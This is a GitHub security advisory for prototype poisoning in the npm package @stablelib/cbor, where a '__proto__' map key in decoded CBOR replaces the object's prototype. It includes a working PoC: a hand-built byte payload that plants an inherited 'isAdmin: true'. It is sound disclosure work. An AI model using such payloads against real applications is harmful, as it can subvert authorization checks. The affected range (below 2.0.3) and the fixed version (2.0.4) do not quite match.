# [H] @stablelib/cbor: Prototype poisoning via `__proto__` map keys in CBOR decoding

## Summary
Severity: High
Advisory: GHSA-w48f-fwg7-ww6p
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N (CVSS_V4)
Published: 2026-04-04
Source: https://github.com/advisories/GHSA-w48f-fwg7-ww6p
Type: github-advisory

## Affected
- npm: `@stablelib/cbor` — affected >=0 <2.0.3

## Details
### Summary

`@stablelib/cbor` decodes CBOR maps into ordinary JavaScript objects and assigns attacker-controlled keys directly onto those objects. A CBOR map key named `__proto__` therefore changes the prototype of the decoded object instead of becoming an ordinary data property.

### Details

The decoder builds map results with a plain `{}` and then stores attacker-controlled keys using bracket assignment.

That is unsafe for special property names. In JavaScript, assigning to `obj["__proto__"]` on a normal object does not create a plain own property. It invokes the built-in `__proto__` setter and replaces the object’s prototype if the supplied value is an object or `null`.

As a result, a CBOR payload containing a map entry like:

* key: `"__proto__"`
* value: `{ isAdmin: true }`

does not decode to an object with an own property called `__proto__`. It decodes to an object whose prototype is now attacker-controlled. Any code that later reads properties through normal lookup will see inherited attacker-supplied values.

### PoC

```js
import { decode } from "@stablelib/cbor";

// CBOR:
// {
//   "__proto__": { "isAdmin": true }
// }
//
// a1                    map(1)
//   69                  text(9)
//     "__proto__"
//   a1                  map(1)
//     67                text(7)
//       "isAdmin"
//     f5                true

const payload = new Uint8Array([
  0xa1,
  0x69, 0x5f, 0x5f, 0x70, 0x72, 0x6f, 0x74, 0x6f, 0x5f, 0x5f,
  0xa1,
  0x67, 0x69, 0x73, 0x41, 0x64, 0x6d, 0x69, 0x6e,
  0xf5
]);

const obj = decode(payload);

console.log(Object.hasOwn(obj, "isAdmin")); // false
console.log(obj.isAdmin);                   // true
console.log(Object.getPrototypeOf(obj).isAdmin); // true
```

### Impact

Any application that decodes untrusted CBOR into JavaScript objects can receive objects with attacker-controlled prototypes.

In practice, that can corrupt configuration objects, influence authorization checks, alter feature flags, and break application logic that relies on normal property lookup instead of strict own-property checks. If the decoded object is later merged into other objects, the impact can spread further.

### Solution

Upgrade to version 2.0.4.

## References
- https://github.com/StableLib/stablelib/security/advisories/GHSA-w48f-fwg7-ww6p
- https://github.com/StableLib/stablelib/commit/0f153a63b7552a0e8721f640984113e419015026
- https://github.com/StableLib/stablelib
